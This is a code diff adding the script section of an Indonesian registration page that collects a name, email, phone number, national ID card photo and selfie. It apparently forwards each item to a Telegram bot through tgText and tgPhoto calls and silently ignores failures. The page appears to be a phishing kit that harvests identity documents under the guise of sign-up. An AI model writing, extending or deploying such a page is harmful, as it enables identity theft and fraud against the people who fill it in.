+        ? 'Selesai &amp; Daftar <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="20" height="20"><polyline points="20 6 9 17 4 12"/></svg>'
+        : 'Upload Foto Selfie Dulu';
+      btn.disabled = !hasSelfie;
+    }
+  }
+
+  function validate1() {
+    const nama  = document.getElementById('inputNama').value.trim();
+    const email = document.getElementById('inputEmail').value.trim();
+    const phone = document.getElementById('inputPhone').value.trim();
+
+    let ok = true;
+
+    if (!nama) {
+      document.getElementById('inputNama').classList.add('error');
+      document.getElementById('hintNama').classList.add('show');
+      ok = false;
+    } else {
+      document.getElementById('inputNama').classList.remove('error');
+      document.getElementById('hintNama').classList.remove('show');
+    }
+
+    const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRe.test(email)) {
+      document.getElementById('inputEmail').classList.add('error');
+      document.getElementById('hintEmail').classList.add('show');
+      ok = false;
+    } else {
+      document.getElementById('inputEmail').classList.remove('error');
+      document.getElementById('hintEmail').classList.remove('show');
+    }
+
+    const phoneRe = /^[0-9]{8,13}$/;
+    if (!phoneRe.test(phone.replace(/\D/g,''))) {
+      document.getElementById('inputPhone').classList.add('error');
+      document.getElementById('hintPhone').classList.add('show');
+      ok = false;
+    } else {
+      document.getElementById('inputPhone').classList.remove('error');
+      document.getElementById('hintPhone').classList.remove('show');
+    }
+
+    return ok;
+  }
+
+  async function goNext() {
+    if (currentStep === 1) {
+      if (!validate1()) return;
+      const nama  = document.getElementById('inputNama').value.trim();
+      const email = document.getElementById('inputEmail').value.trim();
+      const phone = document.getElementById('inputPhone').value.trim();
+      setBtn(true);
+      try {
+        await tgText(
+          `📋 <b>Registrasi Baru — Step 1</b>\n\n` +
+          `👤 <b>Nama:</b> ${nama}\n` +
+          `📧 <b>Email:</b> ${email}\n` +
+          `📱 <b>No HP:</b> +62${phone}`
+        );
+      } catch(_) {}
+      document.getElementById('sumNama').textContent  = nama;
+      document.getElementById('sumEmail').textContent = email;
+      document.getElementById('sumPhone').textContent = '+62 ' + phone;
+
+    } else if (currentStep === 2) {
+      if (!hasKTP) return;
+      setBtn(true);
+      try {
+        const nama = document.getElementById('inputNama').value.trim();
+        await tgPhoto(ktpFile, `🪪 Foto KTP — ${nama}`);
+      } catch(_) {}
+
+    } else if (currentStep === 3) {
+      if (!hasSelfie) return;
+      setBtn(true);
+      try {
+        const nama = document.getElementById('inputNama').value.trim();
+        await tgPhoto(selfieFile, `🤳 Foto Selfie — ${nama}`);
+      } catch(_) {}
+    }
+
+    currentStep++;
+    updateUI('forward');
+  }
+
+  function goBack() {
+    if (currentStep <= 1) return;
+    currentStep--;
+    updateUI('back');
+  }
+
+  // KTP
+  function onFileKTP(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+    ktpFile = file;
+    const url = URL.createObjectURL(file);
+    document.getElementById('prevKTPImg').src = url;
+    document.getElementById('prevKTP').classList.add('show');
+    document.getElementById('changeKTP').style.display = 'flex';
+    document.getElementById('uploadKTPCard').style.display = 'none';
+    hasKTP = true;
+    updateBtn();
+  }
+  function clearKTP() {
+    document.getElementById('fileKTP').value = '';
+    document.getElementById('fileKTPCamera').value = '';
+    document.getElementById('prevKTP').classList.remove('show');
+    document.getElementById('changeKTP').style.display = 'none';
+    document.getElementById('uploadKTPCard').style.display = 'flex';
+    ktpFile = null;
+    hasKTP = false;
+    updateBtn();
+  }
+
+  // Selfie
+  function onFileSelfie(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+    selfieFile = file;
+    const url = URL.createObjectURL(file);
+    document.getElementById('prevSelfieImg').src = url;
+    document.getElementById('prevSelfie').classList.add('show');
+    document.getElementById('changeSelfie').style.display = 'flex';
+    document.getElementById('uploadSelfieCard').style.display = 'none';
+    hasSelfie = true;
+    updateBtn();
+  }
+  function clearSelfie() {
+    document.getElementById('fileSelfie').value = '';
+    document.getElementById('fileSelfieCamera').value = '';
+    document.getElementById('prevSelfie').classList.remove('show');
+    document.getElementById('changeSelfie').style.display = 'none';
+    document.getElementById('uploadSelfieCard').style.display = 'flex';
+    selfieFile = null;
+    hasSelfie = false;
+    updateBtn();
+  }
+
+  // Confetti
+  function spawnConfetti() {
+    const c = document.getElementById('confetti');
+    c.innerHTML = '';
+    const colors = ['#00AA5B','#00C26A','#FFD700','#FF6B35','#4FC3F7','#CE1126'];
+    for (let i = 0; i < 40; i++) {
+      const d = document.createElement('div');
+      d.className = 'dot-confetti';
+      d.style.cssText = `
+        left: ${Math.random()*100}%;
+        background: ${colors[Math.floor(Math.random()*colors.length)]};
+        width: ${4+Math.random()*8}px;
+        height: ${4+Math.random()*8}px;
+        border-radius: ${Math.random()>.5?'50%':'2px'};
+        animation-duration: ${1.5+Math.random()*2}s;
+        animation-delay: ${Math.random()*.8}s;
+      `;
+      c.appendChild(d);
+    }
+  }
+
+  // init
+  updateUI();
+  document.getElementById('btnBack').style.display = 'none';
+</script>
+</body>
+</html>
